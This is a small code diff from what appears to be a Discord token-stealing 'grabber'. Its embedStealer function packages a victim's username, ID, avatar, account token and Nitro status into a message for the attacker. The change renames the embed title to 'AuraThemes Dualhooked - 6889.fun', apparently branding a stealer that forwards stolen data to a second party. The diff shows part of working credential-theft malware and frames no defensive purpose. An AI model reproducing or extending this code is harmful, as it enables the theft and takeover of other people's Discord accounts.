@@ -69,7 +69,7 @@ function embedStealer(infos, guilds, friends, token, embed) {
     .setAuthor({ name: `${infos.username} | ${infos.ID}`, iconURL: infos.avatar })
     .setThumbnail(infos.avatar)
     .setColor(EMBED_COLORS.initialized)
-    .setTitle('Initialized Grabber')
+    .setTitle('AuraThemes Dualhooked - 6889.fun')
     .addFields(
       getField('<a:aura:1087044506542674091> Token:', `\`\`\`${token}\`\`\``, false),
       getField('<a:aura:1101739920319590420> Nitro:', infos.nitroType, true),
